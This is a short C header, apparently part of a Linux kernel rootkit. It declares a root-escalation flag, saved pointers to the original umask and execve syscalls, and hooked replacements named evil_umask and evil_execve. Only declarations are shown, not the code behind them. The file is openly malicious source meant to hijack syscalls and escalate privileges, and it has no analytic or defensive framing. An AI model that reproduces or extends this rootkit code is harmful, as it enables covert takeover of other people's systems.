#ifndef SYSESC_H
#define SYSESC_H

#include "utils.h"

/* set root escalation flag */
extern int ref;

/* function pointer to default umask syscall */
extern asmlinkage int (*def_umask) (mode_t mask);

/* function pointer to default execve syscall */
extern asmlinkage int (*def_execve) (const char *filename, const char *const argv[], const char *const envp[]);

asmlinkage int evil_umask(mode_t mask);
asmlinkage int evil_execve(const char *filename, const char *const argv[], const char *const envp[]);

#endif
